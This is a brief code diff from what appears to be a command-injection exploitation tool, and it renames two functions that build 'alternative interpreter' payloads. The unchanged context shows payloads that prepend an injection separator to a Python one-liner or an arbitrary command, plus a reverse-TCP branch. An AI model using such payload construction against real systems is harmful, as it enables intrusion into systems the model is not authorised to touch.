@@ -46,7 +46,7 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
+def decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
@@ -102,7 +102,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
+def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
       payload = (separator + cmd + settings.SINGLE_WHITESPACE
